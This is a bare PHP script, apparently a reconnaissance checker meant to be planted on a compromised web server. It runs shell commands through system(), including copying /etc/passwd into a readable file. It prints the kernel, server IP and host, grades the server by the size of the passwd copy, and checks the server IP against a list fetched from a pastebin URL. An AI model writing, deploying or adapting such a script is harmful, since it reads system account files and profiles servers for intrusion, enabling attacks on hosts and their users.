<?php 

 
system("pwd")."<br>"; 
system("cat /etc/passwd > p.txt"); 
  $release = @php_uname('r');
  $kernel = @php_uname('a');
        $server = @$_SERVER["SERVER_ADDR"] ;
        //$config = file_get_contents('./index.php');
        $host = $_SERVER['HTTP_HOST'];
  //echo $kernel, $release, $server, $config, $host ;
  echo $kernel."<br>"; 
        echo $release."<br>";
        echo $server."<br>";
        echo $host."<br>";
$filename = 'p.txt'; 
$size = filesize($filename);
if ($size > 5000) { echo 'pass_good'."<br>" ;} 
else { echo 'pass_bad'."<br>" ;}
        
define('CHECK_URL', 'https://pastebin.com/raw/Twp4TRZc'); 
/* * */
$patterns = array ($server) ; 
$results = array(); 
$contents = file(CHECK_URL);
$matches = array();
foreach ($contents as $line) {
    foreach ($patterns as $pattern) {
        $tmp = array();
        if (strstr($line, $pattern) !== FALSE) {
            $results[$pattern] ++;
        }
    }
}

if (count($results) > 0) { echo 'ip_bad' ;} 
else { echo 'ip_good' ;} 
?>